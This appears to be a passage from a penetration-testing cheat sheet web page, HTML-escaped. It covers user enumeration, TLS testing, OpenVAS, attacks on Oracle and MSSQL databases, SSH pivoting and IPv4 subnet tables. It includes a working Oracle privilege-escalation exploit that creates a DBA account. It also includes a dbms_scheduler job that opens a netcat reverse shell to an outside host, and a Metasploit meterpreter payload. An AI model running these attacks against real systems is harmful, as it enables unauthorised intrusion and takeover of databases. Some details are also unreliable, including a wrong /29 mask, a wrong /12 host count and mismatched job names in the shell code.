&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;rusers-scan-whole-subnet&quot;&gt;rusers scan whole Subnet&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlogin -l &amp;lt;user&amp;gt; &amp;lt;target&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;e.g rlogin -l root TARGET-SUBNET/24&lt;/p&gt;

&lt;h3 id=&quot;finger-enumeration&quot;&gt;Finger Enumeration&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;finger @TARGET-IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;finger-a-specific-username&quot;&gt;Finger a Specific Username&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;finger batman@TARGET-IP 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;solaris-bug-that-shows-all-logged-in-users&quot;&gt;Solaris bug that shows all logged in users:&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;finger 0@host  

SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;rwho&quot;&gt;rwho&lt;/h3&gt;

&lt;p&gt;Use nmap to identify machines running rwhod (513 UDP)&lt;/p&gt;

&lt;h2 id=&quot;tls--ssl-testing&quot;&gt;TLS &amp;amp; SSL Testing&lt;/h2&gt;

&lt;h3 id=&quot;testsslsh&quot;&gt;testssl.sh&lt;/h3&gt;

&lt;p&gt;Test all the things on a single host and output to a .html file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &amp;gt; OUTPUT-FILE.html  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;vulnerability-assessment&quot;&gt;Vulnerability Assessment&lt;/h2&gt;

&lt;p&gt;Install OpenVAS 8 on Kali Rolling:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Verify openvas is running using:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -tulpn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup.&lt;/p&gt;

&lt;h2 id=&quot;database-penetration-testing&quot;&gt;Database Penetration Testing&lt;/h2&gt;

&lt;p&gt;Attacking database servers exposed on the network.&lt;/p&gt;

&lt;h3 id=&quot;oracle&quot;&gt;Oracle&lt;/h3&gt;

&lt;p&gt;Install oscanner:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install oscanner  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Run oscanner:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;oscanner -s 192.168.1.200 -P 1521 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;fingerprint-oracle-tns-version&quot;&gt;Fingerprint Oracle TNS Version&lt;/h4&gt;

&lt;p&gt;Install tnscmd10g:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install tnscmd10g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fingerprint oracle tns:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;brute-force-oracle-user-accounts&quot;&gt;Brute force oracle user accounts&lt;/h4&gt;

&lt;p&gt;Identify default Oracle accounts:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Run nmap scripts against Oracle TNS:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p 1521 -A TARGET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;oracle-privilege-escalation&quot;&gt;Oracle Privilege Escalation&lt;/h4&gt;

&lt;p&gt;Requirements:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Oracle needs to be exposed on the network&lt;/li&gt;
  &lt;li&gt;A default account is in use like scott&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Quick overview of how this works:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create the function&lt;/li&gt;
  &lt;li&gt;Create an index on table SYS.DUAL&lt;/li&gt;
  &lt;li&gt;The index we just created executes our function SCOTT.DBA_X&lt;/li&gt;
  &lt;li&gt;The function will be executed by SYS user (as that’s the user that owns the table).&lt;/li&gt;
  &lt;li&gt;Create an account with DBA priveleges&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In the example below the user SCOTT is used but this should be possible with another default Oracle account.&lt;/p&gt;

&lt;h5 id=&quot;identify-default-accounts-within-oracle-db-using-nmap-nse-scripts&quot;&gt;Identify default accounts within oracle db using NMAP NSE scripts:&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Login using the identified weak account (assuming you find one).&lt;/p&gt;

&lt;h5 id=&quot;how-to-identify-the-current-privilege-level-for-an-oracle-user&quot;&gt;How to identify the current privilege level for an oracle user:&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; select * from session_privs; 

SQL&amp;gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;oracle-priv-esc-and-obtain-dba-access&quot;&gt;Oracle priv esc and obtain DBA access:&lt;/h5&gt;

&lt;p&gt;Run netcat: &lt;code&gt;netcat -nvlp 443&lt;/code&gt;code&amp;gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;run-the-exploit-with-a-select-query&quot;&gt;Run the exploit with a select query:&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; Select * from session_privs; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You should have a DBA user with creds user1 and pass1.&lt;/p&gt;

&lt;p&gt;Verify you have DBA privileges by re-running the first command again.&lt;/p&gt;

&lt;h5 id=&quot;remove-the-exploit-using&quot;&gt;Remove the exploit using:&lt;/h5&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drop index exploit_1337; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;get-oracle-reverse-os-shell&quot;&gt;Get Oracle Reverse os-shell:&lt;/h5&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;begin
dbms_scheduler.create_job( job_name    =&amp;gt; 'MEH1337',job_type    =&amp;gt;
    'EXECUTABLE',job_action =&amp;gt; '/bin/nc',number_of_arguments =&amp;gt; 4,start_date =&amp;gt;
    SYSTIMESTAMP,enabled    =&amp;gt; FALSE,auto_drop =&amp;gt; TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;

&lt;p&gt;Enumeration / Discovery:&lt;/p&gt;

&lt;p&gt;Nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Metasploit:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/mssql/mssql_ping
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Use MS SQL Servers Browse For More&lt;/h5&gt;
  &lt;p&gt;Try using &quot;Browse for More&quot; via MS SQL Server Management Studio&lt;/p&gt;
&lt;/div&gt;

&lt;h4 id=&quot;bruteforce-mssql-login&quot;&gt;Bruteforce MSSQL Login&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/mssql/mssql_enum
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;metasploit-mssql-shell&quot;&gt;Metasploit MSSQL Shell&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) &amp;gt; set PAYLOAD windows/meterpreter/reverse_tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;network&quot;&gt;Network&lt;/h2&gt;

&lt;h3 id=&quot;plinkexe-tunnel&quot;&gt;Plink.exe Tunnel&lt;/h3&gt;

&lt;p&gt;PuTTY Link tunnel&lt;/p&gt;

&lt;p&gt;Forward remote port to local address:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pivoting&quot;&gt;Pivoting&lt;/h3&gt;

&lt;h4 id=&quot;ssh-pivoting&quot;&gt;SSH Pivoting&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add socks4 127.0.0.1 1010 in /etc/proxychains.conf&lt;/p&gt;

&lt;p&gt;SSH pivoting from one network to another:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add socks4 127.0.0.1 1010 in /etc/proxychains.conf&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add socks4 127.0.0.1 1011 in /etc/proxychains.conf&lt;/p&gt;

&lt;h4 id=&quot;meterpreter-pivoting&quot;&gt;Meterpreter Pivoting&lt;/h4&gt;

&lt;h3 id=&quot;ttl-finger-printing&quot;&gt;TTL Finger Printing&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operating System&lt;/th&gt;
      &lt;th&gt;TTL Size&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Windows&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;&lt;code&gt;128&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Linux&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;&lt;code&gt;64&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Solaris&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;&lt;code&gt;255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Cisco / Network&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ipv4-cheat-sheets&quot;&gt;IPv4 Cheat Sheets&lt;/h3&gt;

&lt;h4 id=&quot;classful-ip-ranges&quot;&gt;Classful IP Ranges&lt;/h4&gt;

&lt;p&gt;E.g Class A,B,C (depreciated)&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Class&lt;/th&gt;
      &lt;th&gt;IP Address Range&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Class A IP Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;0.0.0.0 - 127.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class B IP Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;128.0.0.0 - 191.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class C IP Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;192.0.0.0 - 223.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class D IP Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;224.0.0.0 - 239.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class E IP Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;240.0.0.0 - 255.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;ipv4-private-address-ranges&quot;&gt;IPv4 Private Address Ranges&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Class&lt;/th&gt;
      &lt;th&gt;Range&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;Class A Private Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;10.0.0.0 - 10.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class B Private Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;172.16.0.0 - 172.31.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;Class C Private Address Range&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;192.168.0.0 - 192.168.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;  
      &lt;td&gt;
        &lt;p&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;127.0.0.0 - 127.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;ipv4-subnet-cheat-sheet&quot;&gt;IPv4 Subnet Cheat Sheet&lt;/h4&gt;

&lt;p&gt;Subnet cheat sheet, not really realted to pen testing but a useful reference.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;CIDR&lt;/th&gt;
      &lt;th&gt;Decimal Mask&lt;/th&gt;
      &lt;th&gt;Number of Hosts&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/31&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.254&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;1 Host&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/30&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.252&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;2 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/29&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.249&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;6 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/28&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.240&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;14 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/27&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.224&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;30 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/26&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.192&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;62 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/25&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.128&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;126 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/24&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.255.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;254 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/23&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.254.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;512 Host&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/22&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.252.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;1022 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/21&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.248.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;2046 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/20&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.240.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;4094 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/19&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.224.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;8190 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/18&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.192.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;16382 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/17&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.128.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;32766 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/16&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.255.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;65534 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/15&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.254.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;131070 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/14&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.252.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;262142 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/13&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.248.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;524286 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;


    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;/12&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;255.240.0.0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;1048674 Hosts&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
